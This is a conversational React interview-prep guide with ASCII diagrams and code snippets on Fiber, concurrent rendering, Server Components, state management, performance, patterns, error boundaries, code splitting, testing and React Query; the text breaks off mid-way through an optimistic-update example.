# React Advanced Interview Guide — 15 Years Experience
## Conversational Script | Real-World Examples | ASCII Diagrams

> Every answer is written as spoken words to an interviewer.
> Real app examples: Amazon-style e-commerce, Slack-style chat, Swiggy-style dashboard.

---

## 1. React Fiber Architecture

**Q: "Explain how the React Fiber reconciler works."**

---

**HOW TO SAY IT (spoken to interviewer):**

> "Let me use a real example to explain this. Imagine you're building an Amazon-style
> product listing page with 500 items. Without Fiber, React would lock up the
> browser for the entire duration of rendering those 500 items — you couldn't
> click, scroll, or type. Fiber broke that into tiny pauseable steps.
>
> Here's the problem Fiber solved..."

```
REAL APP: Amazon Product Listing Page
──────────────────────────────────────────────────────────────────
WITHOUT FIBER (React < 16):

  User searches "laptop" → 500 results come back
  React starts rendering ALL 500 items as one giant job

  Timeline:
  |--render item 1--|--item 2--|--...--|--item 500--|
  <───────────── 80ms ─────────────────────────────>
                          ↑
                  Browser FROZEN here
                  User clicks "Sort by Price" — NO RESPONSE
                  User types in search box — NOTHING HAPPENS
                  User sees spinner, gets frustrated, leaves

WITH FIBER (React 16+):

  React renders item 1... checks: "browser need to do anything?"
  → NO → item 2... checks → NO → item 3... checks...
  → YES (user clicked!) → PAUSE rendering
  → handle click IMMEDIATELY (< 1ms)
  → RESUME from item 3 where we left off

  Timeline:
  |-item 1-|-item 2-|[PAUSE→click handled]|-item 3-|-...-|-item 500-|
              ↑                  ↑
        2ms per item     16ms frame budget respected
        always responsive     no jank
```

```
HOW FIBER WORKS INTERNALLY:

OLD WAY: Recursive call stack (can't pause)
──────────────────────────────────────────
renderPage()
  └─ renderSidebar()
       └─ renderFilters()
            └─ renderFilter() × 20
  └─ renderProductGrid()
       └─ renderProductCard() × 500   ← stuck here, can't escape

NEW WAY: Linked list of fiber nodes (can pause at any node)
───────────────────────────────────────────────────────────

  [Page]─child─►[Sidebar]─sibling─►[ProductGrid]
                    │                    │
                  child                child
                    │                    │
                [Filters]           [Card #1]─sibling─►[Card #2]─►...
                    │
                  child
                    │
                [Filter]─sibling─►[Filter]─►...

  Each box = one Fiber Node (JS object):
  ┌──────────────────────────────────────────────────────┐
  │  type:         ProductCard (function reference)       │
  │  stateNode:    actual <div> in the DOM                │
  │  child:   ──►  first child fiber                      │
  │  sibling: ──►  next sibling fiber                     │
  │  return:  ──►  parent fiber                           │
  │  pendingProps: { title: "Dell Laptop", price: 45000 } │
  │  memoizedProps:{ title: "Dell Laptop", price: 40000 } │
  │  effectTag:    UPDATE  (price changed)                │
  │  lanes:        0b0000010  (DefaultLane priority)      │
  └──────────────────────────────────────────────────────┘

  React walks this linked list one node at a time.
  Can stop between ANY two nodes — just remember current position.
```

```
TWO PHASES:

  PHASE 1: RENDER PHASE  (can be interrupted)
  ─────────────────────────────────────────────
  React walks the fiber tree
  For each node: "did anything change?"
  Marks effects: UPDATE / PLACEMENT / DELETION
  CAN PAUSE HERE — work in progress stays in memory

  PHASE 2: COMMIT PHASE  (cannot be interrupted)
  ──────────────────────────────────────────────
  Applies ALL marked changes to the real DOM at once
  Runs useLayoutEffect (sync, before paint)
  Runs useEffect (async, after paint)
  Must be atomic — partial DOM = broken UI
  Usually < 5ms

  WHY CAN'T COMMIT BE INTERRUPTED?
  Imagine showing the user a product card with price updated
  but image still showing old product — that's a partial commit.
  Fiber ensures "all or nothing" for DOM writes.
```

> "The key insight is: Fiber turns rendering from a recursive function call
> that can't be paused, into a linked list traversal that can stop at any node.
> That's what makes Concurrent Mode possible."

---

## 2. Concurrent Mode & startTransition

**Q: "What is Concurrent Mode? How does startTransition work in practice?"**

---

**HOW TO SAY IT:**

> "Concurrent Mode is best explained with a Swiggy-style food delivery app.
> You have a search bar at the top and a restaurant list below. When the user
> types, you need to do two things: update the input (must feel instant) and
> filter 500 restaurants (can take time). Before React 18, both happened in
> the same synchronous update — so fast typing felt laggy. startTransition
> lets you say 'the input is urgent, the list filter can wait.'"

```
REAL APP: Swiggy Restaurant Search
────────────────────────────────────────────────────────────────
User types "Piz" quickly → "Pizz" → "Pizza"

WITHOUT startTransition:
  User types "P"
  ├─ React updates input to "P"        (1ms — fast)
  └─ React filters 500 restaurants     (40ms — slow)
                                            ↑
  User types "i" while filtering is running
  → React must WAIT 40ms before processing the "i"
  → Input feels like it's lagging behind fingers

WITH startTransition:
  User types "P"
  ├─ setQuery("P")             ← URGENT — runs immediately
  └─ startTransition(() => {
       setFilteredList(...)    ← NON-URGENT — can be interrupted
     })

  User types "i" while filtering is running
  → React INTERRUPTS the filtering
  → Processes the "i" keystroke FIRST
  → Restarts filtering with "Pi" as the new value
  → Input always shows what you typed, list catches up

TIMELINE:
  keydown "P" ──► input shows "P" (1ms)
                  filtering starts for "P"
  keydown "i" ──► INTERRUPT filter
                  input shows "Pi" (1ms)
                  filtering starts for "Pi"
  keydown "z" ──► INTERRUPT filter
                  input shows "Piz" (1ms)
                  filtering starts for "Piz"
  [user pauses]── filter for "Piz" completes (40ms)
                  list updates ✅
```

```
THREE CONCURRENT APIs — WHEN TO USE EACH:

  ┌─────────────────┬──────────────────────────┬───────────────────────┐
  │ API             │ USE WHEN                 │ GIVES YOU             │
  ├─────────────────┼──────────────────────────┼───────────────────────┤
  │ startTransition │ You own the setState call │ Nothing (fire+forget) │
  │ useTransition   │ Same + need loading UI   │ [isPending, startFn]  │
  │ useDeferredValue│ You receive value as prop │ Lagged copy of value  │
  └─────────────────┴──────────────────────────┴───────────────────────┘

  // useTransition — SearchBar owns the setState
  function SearchBar() {
    const [query, setQuery] = useState('');
    const [results, setResults] = useState(allRestaurants);
    const [isPending, startTransition] = useTransition();

    const handleChange = (e) => {
      setQuery(e.target.value);                    // urgent
      startTransition(() => {
        setResults(filter(allRestaurants, e.target.value)); // deferrable
      });
    };

    return (
      <>
        <input value={query} onChange={handleChange} />
        {isPending && <div className="filtering-spinner" />}
        <RestaurantList items={results} />
      </>
    );
  }

  // useDeferredValue — RestaurantList receives query as prop
  // (can't control the setState — it's in a parent)
  function RestaurantList({ query }) {
    const deferredQuery = useDeferredValue(query);
    // First render: shows old results instantly
    // Background: computes new results with new query
    // When done: updates to new results
    const results = useMemo(
      () => filter(allRestaurants, deferredQuery),
      [deferredQuery]
    );
    return <ul>{results.map(r => <RestaurantItem key={r.id} {...r} />)}</ul>;
  }
```

```
PRIORITY LANES (React internals — shows depth):

  SyncLane            → onClick, onKeyDown        [HIGHEST]
  InputContinuousLane → onInput, onScroll
  DefaultLane         → normal setState
  TransitionLane      → startTransition()
  IdleLane            → background prefetch        [LOWEST]

  When two updates compete, higher lane always wins.
  Lower lane update gets interrupted and retried later.
```

> "The mental model I use: startTransition is a permission slip you give React
> saying 'I'm okay if this update is slow.' React will always process urgent
> things first — clicks, keystrokes — and come back to your transition when
> the browser has a free frame."

---

## 3. React Server Components

**Q: "Explain RSC. How is it different from SSR?"**

---

**HOW TO SAY IT:**

> "This is one I see confused a lot. Let me use an Amazon product detail page
> as an example. That page has maybe 30 components — title, price, images,
> reviews, related products, add-to-cart button, wishlist button.
> Out of those 30, maybe 3 actually need to be interactive: add-to-cart,
> wishlist, and image zoom. SSR renders all 30 to HTML but still ships all 30
> as JavaScript for hydration. RSC says: those 27 display-only components
> should never touch the browser's JS engine at all."

```
REAL APP: Amazon Product Detail Page

  WITHOUT RSC — everything is JS:
  ┌─────────────────────────────────────────────────────────┐
  │  Browser downloads: react.js + all 30 components as JS   │
  │  Browser parses ALL 30 component definitions             │
  │  Browser hydrates ALL 30 components                      │
  │  Bundle size: ~450KB just for this page                  │
  └─────────────────────────────────────────────────────────┘

  WITH RSC — only interactive parts are JS:
  ┌─────────────────────────────────────────────────────────┐
  │  ProductPage         (Server — reads DB, zero JS)        │
  │  ├── ProductTitle    (Server — zero JS)                  │
  │  ├── PriceDisplay    (Server — zero JS)                  │
  │  ├── ImageGallery    (Server — zero JS, but...)          │
  │  │     └─ ZoomButton ('use client' — needs onClick) ←JS  │
  │  ├── ProductDetails  (Server — zero JS)                  │
  │  ├── ReviewSection   (Server — await db.reviews.findAll) │
  │  │     └─ LikeButton ('use client' — needs click) ←JS   │
  │  └── AddToCartBtn    ('use client' — needs state) ←JS   │
  │                                                          │
  │  JS shipped: 3 components only (ZoomBtn, LikeBtn, Cart)  │
  │  Bundle size: ~80KB  (vs 450KB)                          │
  │  DB query runs directly in ProductPage — no API needed   │
  └─────────────────────────────────────────────────────────┘
```

```
SSR vs RSC vs CSR — SIDE BY SIDE:

                  CSR               SSR              RSC
  ─────────────  ──────────────     ──────────────   ────────────────────
  Runs on        Browser            Server+Browser   Server only (for SC)
  JS to client   Full bundle        Full bundle      Zero (for SC)
  Can await DB   No (needs API)     No (needs API)   YES — direct query
  Has useState   Yes                Yes              NO
  Has onClick    Yes                No (server)      NO
  Initial HTML   Empty <div>        Full HTML        Full HTML
  Hydration      Full               Full             Only Client parts
  SEO            Poor               Good             Good
  Bundle size    Largest            Large            Smallest

  // Server Component — runs on server, never in browser
  async function ProductPage({ id }) {           // async by default!
    const product = await db.products.findById(id); // direct DB
    const reviews = await db.reviews.find({ productId: id });
    // No useEffect, no loading state, no API call needed
    return (
      <div>
        <h1>{product.title}</h1>
        <p>{product.price}</p>
        <ReviewList reviews={reviews} />        {/* Server Component */}
        <AddToCartButton productId={id} />      {/* Client Component */}
      </div>
    );
  }
```

```
THE ONE RULE THAT TRIPS PEOPLE:

  Server CAN hold Client ✅         Client CANNOT import Server ❌
  ────────────────────────          ──────────────────────────────
  // page.tsx (Server)              // CartButton.tsx ('use client')
  import CartButton from            import ProductData from
    './CartButton' // ← client        './ProductData'  // ← server
  // Fine — Cart runs in browser    // ERROR — server component
                                    // can't be bundled for browser

  WORKAROUND — pass Server output as children:
  // page.tsx (Server)
  <ClientShell>
    <ServerDataDisplay />   {/* resolved before client receives it */}
  </ClientShell>
  // ClientShell.tsx ('use client')
  export function ClientShell({ children }) {
    const [open, setOpen] = useState(false);
    return <div onClick={() => setOpen(true)}>{children}</div>;
    // children = already-rendered Server output, treated as opaque
  }
```

> "My rule in a Next.js 13+ project: everything starts as a Server Component
> by default. I only add 'use client' when I need useState, useEffect,
> event handlers, or browser APIs. That way I'm shipping the minimum JS
> necessary and my database queries live right next to the UI that uses them."

---

## 4. State Management at Scale

**Q: "How do you choose your state management approach?"**

---

**HOW TO SAY IT:**

> "The mistake I've seen teams make — including ones I've been on — is
> treating all state the same. In a Slack-style chat app, for example,
> you have at least 4 completely different categories of state. Getting
> this categorization right first saves you from over-engineering."

```
REAL APP: Slack-style Chat Application

  STATE CATEGORY MAP:
  ──────────────────────────────────────────────────────────────
  Category         Example                    Best Tool
  ───────────────  ─────────────────────────  ──────────────────
  Server state     Message list, user list,   React Query
                   channel info               (cache, polling,
                                              background refetch)

  Global UI state  Current user, theme,       Zustand (simple)
                   sidebar open/closed,       or Context (small)
                   notification count

  URL state        Active channel, search     URL search params
                   query, selected message    (survives refresh,
                                              shareable link)

  Local state      Is this message being      useState in that
                   edited? Input value        component only

  Form state       Create channel form,       React Hook Form
                   edit profile form          (uncontrolled,
                                              fast, validation)
  ──────────────────────────────────────────────────────────────

  WHAT PUTTING EVERYTHING IN REDUX LOOKS LIKE (anti-pattern):
  store = {
    messages: [...],          // should be React Query
    users: [...],             // should be React Query
    channels: [...],          // should be React Query
    currentUser: {...},       // OK in Zustand/Context
    theme: 'dark',            // OK in Context
    searchQuery: 'react',     // should be URL param
    messageInputValue: '...'  // should be local useState
  }
  // Result: Redux store changes 50x/sec from typing
  // Devtools become useless noise
  // Everything re-renders on every keypress
```

```
CONTEXT RE-RENDER TRAP — THE HIDDEN PERFORMANCE KILLER:

  // BAD: One context with many concerns
  const AppContext = createContext({
    user,           // changes on login/logout
    theme,          // changes on toggle
    notifications,  // changes every few seconds
    activeChannel   // changes on every channel click
  });

  Component tree with BAD context:
  ┌─────────────────────────────────────────────────────────┐
  │  AppContext.Provider (value = { user, theme, notifs })   │
  │        │                                                 │
  │   ┌────┼────────────────────────┐                        │
  │   │    │                        │                        │
  │  UserAvatar  ThemeToggle   NotifBadge                    │
  │  (needs      (needs         (needs                        │
  │   user)       theme)         notifs)                      │
  └─────────────────────────────────────────────────────────┘

  New notification arrives → value object is NEW reference
  → UserAvatar re-renders  ← WRONG, user didn't change
  → ThemeToggle re-renders ← WRONG, theme didn't change
  → NotifBadge re-renders  ← correct

  // FIX: Split by update frequency
  const UserContext  = createContext(user);         // rare updates
  const ThemeContext = createContext(theme);        // rare updates
  const NotifContext = createContext(notifications);// frequent

  New notification → only NotifBadge re-renders ✅

  // ALSO: Stabilize the value object itself
  const value = useMemo(
    () => ({ user, updateUser }),
    [user]  // only new object when user actually changes
  );
```

> "The test I apply: if I remove React Query and replace it with a plain
> useEffect + useState combo, does my code get significantly more complex?
> Yes every time — because you'd be rebuilding cache invalidation, background
> refetch, loading/error states, and deduplication from scratch."

---

## 5. Performance Optimization

**Q: "We have a 10,000-row data table that's slow. How do you fix it?"**

---

**HOW TO SAY IT:**

> "First thing I'd do is not touch the code. I'd open React DevTools Profiler,
> record an interaction, and see the flame chart. In my experience, the actual
> slow component is often not where you expect. Let me walk through the
> systematic approach I'd use for a financial dashboard with 10k rows..."

```
REAL APP: Financial Dashboard — Transaction Table

  PROFILING FIRST (before touching code):
  ──────────────────────────────────────
  React DevTools → Profiler → record "sort by amount"
  
  Flame chart shows:
  ┌──────────────────────────────────────────────────────────┐
  │  Dashboard        2ms  ← fast, ignore                    │
  │  └─ FilterBar     1ms  ← fast, ignore                    │
  │  └─ TransTable  145ms  ← HERE IS THE PROBLEM             │
  │       └─ Row ×10000  0.014ms each but ×10000 = 140ms     │
  └──────────────────────────────────────────────────────────┘

  Root cause: Sorting triggers top-level state change
              → all 10,000 Row components re-render
              → even rows that didn't change
```

```
FIX LADDER (apply in order, stop when fast enough):

  STEP 1: VIRTUALIZATION — only render visible rows
  ─────────────────────────────────────────────────
  import { useVirtualizer } from '@tanstack/react-virtual';

  Browser viewport = 800px tall
  Row height = 40px
  Visible rows = 800/40 = 20
  Buffer = 10 above + 10 below

  BEFORE:  10,000 DOM nodes in memory
  AFTER:   40 DOM nodes  (+ absolute-positioned spacers)

  ┌─────────────────────────────────────────┐
  │ VIEWPORT (800px)                         │
  │ ┌─────────────────────────────────────┐ │
  │ │  Row 8   [DOM node]  ← visible      │ │   Real
  │ │  Row 9   [DOM node]  ← visible      │ │   DOM
  │ │  Row 10  [DOM node]  ← visible      │ │   nodes:
  │ │  ...     ...                        │ │   ~40
  │ └─────────────────────────────────────┘ │
  │                                          │
  │  Rows 1-7: spacer div (height: 280px)    │ (no DOM)
  │  Rows 28+: spacer div (height: 39720px)  │ (no DOM)
  └─────────────────────────────────────────┘

  Result: 10,000 rows → ~40 DOM nodes → 10-50x faster

  STEP 2: React.memo on Row
  ──────────────────────────
  const Row = React.memo(({ transaction }) => {
    return (
      <tr>
        <td>{transaction.date}</td>
        <td>{transaction.amount}</td>
        <td>{transaction.merchant}</td>
      </tr>
    );
  });
  // Without memo: sort triggers parent render → all 10k rows re-render
  // With memo: only rows whose data changed re-render (usually 0-2)

  STEP 3: useMemo for sort/filter computation
  ────────────────────────────────────────────
  const sortedTransactions = useMemo(
    () => [...transactions].sort((a, b) => b.amount - a.amount),
    [transactions, sortColumn, sortDirection]
  );
  // Without: every render (even unrelated state changes) re-sorts 10k items
  // With: only re-sorts when data or sort config changes

  STEP 4: State colocation — move selectedRow DOWN
  ──────────────────────────────────────────────────
  // BAD: selectedRowId in top-level Dashboard state
  // Every click → Dashboard re-renders → all 10k rows check "am I selected?"

  // GOOD: selectedRowId in URL params or Zustand atom
  // Only the prev-selected and newly-selected Row re-render
```

```
useCallback — WHEN IT HELPS vs WHEN IT'S NOISE:

  SCENARIO A: Passed to React.memo child → HELPS ✅
  ──────────────────────────────────────────────────
  Parent
    └─ React.memo(Row)  ← only re-renders if props change

  const handleRowClick = useCallback((id) => {
    setSelectedId(id);
  }, []); // stable reference

  <Row onClick={handleRowClick} />
  // Without useCallback: parent re-renders → new fn reference
  //   → Row sees new prop → re-renders despite React.memo
  // With useCallback: same reference → Row stays memoized ✅

  SCENARIO B: Standalone, not passed to memo child → NOISE ❌
  ─────────────────────────────────────────────────────────────
  const handleSort = useCallback((column) => {
    setSortColumn(column);
  }, []);
  <button onClick={handleSort}>Sort</button>
  // handleSort is never passed to a memoized child
  // useCallback adds deps array comparison cost with zero benefit
  // REMOVE IT — it's just noise
```

---

## 6. Design Patterns

**Q: "Compare Compound Components vs Render Props vs HOC."**

---

**HOW TO SAY IT:**

> "These are three solutions to the same problem: how do you build flexible,
> reusable components without prop explosion? Let me show each one using a
> real design system example — a Select dropdown."

```
REAL APP: Design System — Select Dropdown Component

  PATTERN 1: COMPOUND COMPONENTS (2023+ preferred)
  ──────────────────────────────────────────────────
  // What the consumer writes:
  <Select defaultValue="mumbai" onChange={handleChange}>
    <Select.Trigger placeholder="Choose city" />
    <Select.Dropdown>
      <Select.Group label="Maharashtra">
        <Select.Option value="mumbai">Mumbai</Select.Option>
        <Select.Option value="pune">Pune</Select.Option>
      </Select.Group>
      <Select.Group label="Karnataka">
        <Select.Option value="bangalore">Bangalore</Select.Option>
      </Select.Group>
    </Select.Dropdown>
  </Select>

  // HOW IT WORKS INTERNALLY:
  // Select creates Context:
  const SelectContext = createContext(null);
  
  function Select({ defaultValue, onChange, children }) {
    const [selected, setSelected] = useState(defaultValue);
    const [isOpen, setIsOpen] = useState(false);
    
    const value = useMemo(() => ({
      selected, setSelected, isOpen, setIsOpen, onChange
    }), [selected, isOpen]);
    
    return (
      <SelectContext.Provider value={value}>
        <div className="select-wrapper">{children}</div>
      </SelectContext.Provider>
    );
  }
  
  // Select.Option reads from context — no prop drilling:
  Select.Option = function({ value, children }) {
    const { selected, setSelected, onChange } = useContext(SelectContext);
    return (
      <li
        className={selected === value ? 'active' : ''}
        onClick={() => { setSelected(value); onChange(value); }}
      >
        {children}
      </li>
    );
  };

  WHY THIS IS BEST:
  ✓ Consumer controls the structure (can add icons, groups, search)
  ✓ No prop drilling (40+ props on a single <Select> tag)
  ✓ Each sub-component is independently testable
  ✓ Matches how HTML native elements work (<table>, <tr>, <td>)
```

```
  PATTERN 2: RENDER PROPS (still valid for lists/tables)
  ──────────────────────────────────────────────────────
  // When the LIBRARY controls structure but YOU control content
  // Example: react-window, tanstack-table

  <FixedSizeList
    height={600}
    itemCount={transactions.length}
    itemSize={50}
    width="100%"
  >
    {({ index, style }) => (          // render prop
      <div style={style}>
        <TransactionRow data={transactions[index]} />
      </div>
    )}
  </FixedSizeList>

  // Library owns: virtualization, scroll, measurement
  // You own: what each row looks like

  STILL VALID IN 2024 FOR:
  ✓ react-window / react-virtual (renderItem)
  ✓ tanstack-table (cell renderers)
  ✓ When structure varies so much that a hook can't capture it

  REPLACED BY CUSTOM HOOKS FOR:
  ✗ Data fetching logic (useFetch is cleaner than DataFetcher render prop)
  ✗ Mouse/keyboard tracking (useMousePosition)
  ✗ Form state (React Hook Form)
```

```
  PATTERN 3: HOC — Higher Order Component
  ──────────────────────────────────────────
  // Takes a component, returns enhanced component
  // Best for: cross-cutting concerns at routing level

  // Auth guard HOC:
  function withAuth(Component) {
    return function AuthenticatedComponent(props) {
      const { user, isLoading } = useAuth();
      if (isLoading) return <PageLoader />;
      if (!user) return <Navigate to="/login" />;
      return <Component {...props} user={user} />;
    };
  }

  const ProtectedDashboard = withAuth(Dashboard);
  const ProtectedProfile   = withAuth(Profile);
  const ProtectedSettings  = withAuth(Settings);

  // Analytics HOC:
  function withPageTracking(Component, pageName) {
    return function TrackedPage(props) {
      useEffect(() => {
        analytics.track('page_view', { page: pageName });
      }, []);
      return <Component {...props} />;
    };
  }

  WHEN HOC IS RIGHT:
  ✓ Wrapping at the route/page level (auth, tracking, error boundaries)
  ✓ Behavior that wraps the entire component (not part of its render)

  WHEN TO PREFER CUSTOM HOOK:
  ✗ Logic that a component needs internally (use useAuth() directly)
  ✗ When prop collisions are likely (HOC injects 'user' — what if Component
    already has a 'user' prop? Collision.)

  HOC PROP COLLISION PROBLEM:
  const Wrapped = withUser(withData(withTheme(MyComponent)));
  // If all three inject a prop called 'data' — last one wins silently
  // Custom hooks don't have this problem
```

---

## 7. Error Boundaries

**Q: "How do Error Boundaries work? What are their limitations?"**

---

**HOW TO SAY IT:**

> "Error Boundaries are React's try-catch for the render phase. Without them,
> one broken component crashes your entire app. With them, you can contain
> the damage to a specific section. Let me show how I'd structure them for
> a news feed app like Twitter..."

```
REAL APP: Twitter/X-style Feed

  WITHOUT ERROR BOUNDARIES:
  ──────────────────────────────────────────────────────────────
  User opens feed → Tweet #247 has malformed data (null author)
  Tweet component throws: "Cannot read properties of null (reading 'name')"
  ENTIRE FEED crashes → blank white screen → user sees nothing

  WITH GRANULAR ERROR BOUNDARIES:
  ──────────────────────────────────────────────────────────────
  <App>
    <ErrorBoundary fallback={<AppCrashPage />}>        ← catch-all
      <Router>
        <Route path="/feed">
          <ErrorBoundary fallback={<FeedError />}>     ← route level
            <Feed>
              {tweets.map(tweet => (
                <ErrorBoundary                         ← item level
                  key={tweet.id}
                  fallback={<BrokenTweetPlaceholder />}
                  onError={(e) => Sentry.captureException(e)}
                >
                  <Tweet data={tweet} />
                </ErrorBoundary>
              ))}
            </Feed>
          </ErrorBoundary>
        </Route>
      </Router>
    </ErrorBoundary>
  </App>

  Tweet #247 crashes → only that tweet shows placeholder
  Other 50 tweets still render ✅
  User can still scroll, like, retweet ✅
  Sentry captures the error for the engineering team ✅
```

```
IMPLEMENTATION:

  class ErrorBoundary extends React.Component {
    state = { hasError: false };

    static getDerivedStateFromError(error) {
      // Called during render phase — update state to show fallback
      return { hasError: true };
    }

    componentDidCatch(error, info) {
      // Called after render — good for logging
      // info.componentStack = which component tree threw
      Sentry.captureException(error, {
        extra: { componentStack: info.componentStack }
      });
    }

    render() {
      if (this.state.hasError) {
        return this.props.fallback;
      }
      return this.props.children;
    }
  }

  WHAT THEY CATCH:       WHAT THEY DON'T CATCH:
  ──────────────────     ───────────────────────────────────
  Errors in render()     Event handlers (use try/catch)
  Errors in lifecycle    Async errors (setTimeout, Promise)
  Errors in children     SSR errors
                         Errors in the boundary itself

  // WORKAROUND: Push async errors into render phase
  function AsyncComponent() {
    const [asyncError, setAsyncError] = useState(null);
    if (asyncError) throw asyncError; // ← caught by nearest boundary

    useEffect(() => {
      fetchData()
        .catch(err => setAsyncError(err)); // ← pushes to render phase
    }, []);
  }
```

---

## 8. Code Splitting & Bundle Optimization

**Q: "How do you architect code splitting in a large app?"**

---

**HOW TO SAY IT:**

> "I worked on a fintech app where the initial bundle was 2.8MB. Users on
> mobile 4G were waiting 8-10 seconds before anything appeared. We got it
> down to 280KB using three levels of code splitting. Let me walk through
> the approach..."

```
REAL APP: Fintech Dashboard (before → after)

  BEFORE: Monolithic bundle
  ─────────────────────────
  index.js: 2.8MB
  ├─ react + react-dom: 140KB
  ├─ react-pdf (reports): 800KB      ← loaded even for login page
  ├─ chart.js (analytics): 600KB     ← loaded even on dashboard
  ├─ rich-text-editor: 400KB         ← loaded even when no notes open
  ├─ date-fns: 200KB                 ← only 3 functions used!
  └─ application code: 660KB

  AFTER: Route + component splitting
  ────────────────────────────────────
  initial.js: 280KB
  ├─ react + react-dom: 140KB
  ├─ application core: 140KB

  dashboard.js: 120KB     (loaded when /dashboard opens)
  analytics.js: 650KB     (loaded when /analytics opens)  ← chart.js here
  reports.js: 820KB       (loaded when /reports opens)    ← pdf here
  editor.js: 410KB        (loaded when editor modal opens)
  vendor-dates.js: 8KB    (only imported functions, tree-shaken)
```

```
CODE SPLITTING IMPLEMENTATION:

  LEVEL 1: ROUTE SPLITTING (always do this first)
  ─────────────────────────────────────────────────
  const Dashboard  = lazy(() => import('./pages/Dashboard'));
  const Analytics  = lazy(() => import('./pages/Analytics'));
  const Reports    = lazy(() => import('./pages/Reports'));

  function App() {
    return (
      <Suspense fallback={<PageSkeleton />}>
        <Routes>
          <Route path="/dashboard" element={<Dashboard />} />
          <Route path="/analytics" element={<Analytics />} />
          <Route path="/reports"   element={<Reports />} />
        </Routes>
      </Suspense>
    );
  }

  LEVEL 2: COMPONENT SPLITTING (heavy, conditional components)
  ─────────────────────────────────────────────────────────────
  // RichTextEditor is 400KB — only loaded when user opens "Add Note" modal
  const RichEditor = lazy(() => import('./components/RichEditor'));

  function NotesModal({ isOpen }) {
    if (!isOpen) return null;   // don't even lazy-load until needed
    return (
      <Suspense fallback={<div>Loading editor...</div>}>
        <RichEditor />
      </Suspense>
    );
  }

  LEVEL 3: FEATURE FLAG SPLITTING
  ──────────────────────────────────
  async function loadFeature(featureKey) {
    if (!featureFlags[featureKey]) return;
    const { Feature } = await import(`./features/${featureKey}`);
    // Feature loaded only for users with flag enabled
  }
```

```
  WHAT NOT TO LAZY LOAD:
  ──────────────────────────────────────────────────────────────
  WRONG: Lazy loading the navigation bar
  const Navbar = lazy(() => import('./Navbar')); // ← bad!
  // Navbar is ALWAYS visible on initial load
  // Lazy loading it = layout shift = worse LCP = bad Core Web Vital

  RULE: Only lazy-load components that are:
  ✓ Below the fold (user must scroll to see)
  ✓ Behind a tab or accordion
  ✓ Inside a modal (not open by default)
  ✓ Feature-flagged (not all users see it)
  ✓ Route-specific (separate pages)
```

---

## 9. Testing Strategy

**Q: "Describe your testing approach for a large React app."**

---

**HOW TO SAY IT:**

> "I think about testing in terms of confidence per dollar. An E2E test
> gives you high confidence but is expensive to write and slow to run.
> A unit test is cheap and fast but gives you narrow confidence.
> For a checkout flow in an e-commerce app, here's how I'd distribute..."

```
REAL APP: Swiggy-style Food Ordering — Testing Pyramid

          ╱━━━━━━━━━╲
         ╱   E2E     ╲        5 tests
        ╱  Playwright  ╲      Critical flows ONLY:
       ╱────────────────╲     - User places an order end-to-end
      ╱  Integration      ╲   - Payment succeeds
     ╱   RTL + MSW         ╲  - Delivery tracking updates
    ╱    (50-100 tests)      ╲
   ╱─────────────────────────╲
  ╱   Unit Tests               ╲  200+ tests
 ╱   Jest (reducers, utils,     ╲  - Price calculation fn
╱    custom hooks)               ╲  - Coupon validation
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ - useCartTotal hook

  INTEGRATION TEST EXAMPLE (what I test at this level):
  ─────────────────────────────────────────────────────
  // Full checkout flow: add item → apply coupon → pay → success
  test('user can complete checkout with valid coupon', async () => {
    // MSW intercepts real fetch calls — no axios-mock, no jest.mock
    server.use(
      http.get('/api/cart', () => HttpResponse.json(mockCart)),
      http.post('/api/coupon/SAVE20', () => HttpResponse.json({ discount: 20 })),
      http.post('/api/order', () => HttpResponse.json({ orderId: 'ORD-123' }))
    );

    render(<CheckoutPage />);

    // Act like a user
    await userEvent.type(screen.getByPlaceholderText('Coupon code'), 'SAVE20');
    await userEvent.click(screen.getByRole('button', { name: 'Apply' }));

    expect(await screen.findByText('₹20 discount applied')).toBeInTheDocument();

    await userEvent.click(screen.getByRole('button', { name: 'Place Order' }));

    expect(await screen.findByText('Order ORD-123 confirmed!')).toBeInTheDocument();
  });
  // This test covers: input handling, API call, state update, success UI
  // All with real fetch() (intercepted by MSW), not mocked functions
```

```
WHY MSW OVER jest.mock:

  WITH jest.mock:                    WITH MSW:
  ───────────────────────            ─────────────────────────────────
  jest.mock('../api/cart');          server.use(
  // Mocks the import                 http.get('/api/cart', () =>
  // Brittle — if you rename            HttpResponse.json(mockCart))
  // the file, test breaks           );
  // If you switch from axios         // Intercepts at network level
  // to fetch, test still passes     // Works with ANY http client
  // (hiding a real bug)             // If you change axios → fetch,
                                     // test correctly re-validates
```

---

## 10. React Query — Advanced

**Q: "How does React Query caching work? When do you use optimistic updates?"**

---

**HOW TO SAY IT:**

> "React Query's cache is what sold me on it. Let me explain with a Twitter
> timeline. You open the app, your feed loads — that's a fetch. You switch
> to Notifications tab and come back to Home — should React fetch again?
> With React Query, that's a config decision, not an architecture decision."

```
REAL APP: Twitter/X Timeline — Cache Behavior

  SCENARIO: User opens feed, switches tabs, comes back

  Without React Query (manual useEffect):
  ──────────────────────────────────────
  useEffect(() => { fetchTweets(); }, []);
  // Every time component mounts → fetch
  // Switch tabs → component unmounts
  // Come back → component mounts → fetch again
  // User sees loading spinner every tab switch

  With React Query:
  ──────────────────────────────────────
  const { data } = useQuery({
    queryKey: ['timeline'],
    queryFn: fetchTimeline,
    staleTime: 30000,  // data is "fresh" for 30 seconds
    gcTime: 5 * 60 * 1000, // keep in memory for 5 minutes
  });

  CACHE LIFECYCLE:
  ┌──────────────────────────────────────────────────────────┐
  │  t=0:   Fetch runs → data cached as FRESH                 │
  │  t=30s: staleTime passes → data is now STALE              │
  │  t=35s: User switches to Notifications tab               │
  │         Component unmounts — but cache stays in memory    │
  │  t=50s: User switches back to Home tab                   │
  │         Component mounts → shows CACHED data instantly    │
  │         Triggers background refetch (data is stale)       │
  │         When refetch completes → silently updates UI      │
  │  t=5min: gcTime passes → cache entry removed from memory  │
  └──────────────────────────────────────────────────────────┘
  User sees instant data on tab switch, never a loading spinner ✅
```

```
OPTIMISTIC UPDATES — When to use:

  REAL APP: Twitter Like Button

  // SCENARIO: User likes a tweet
  // Network request takes 200-500ms
  // Without optimistic update: heart stays gray for 300ms then turns red
  // With optimistic update: heart turns red INSTANTLY

  const likeMutation = useMutation({
    mutationFn: (tweetId) => api.post(`/tweets/${tweetId}/like`),

    onMutate: async (tweetId) => {
      // 1. Cancel any in-flight queries for this tweet
      await queryClient.cancelQueries({ queryKey: ['tweet', tweetId] });

      // 2. Snapshot the current value (for rollback)
      const previousTweet = queryClient.getQueryData(['tweet', tweetId]);

      // 3. Optimistically update the cache
      queryClient.setQueryData(['tweet', tweetId], (old) => ({
        ...old,
        likes: old.likes + 1,
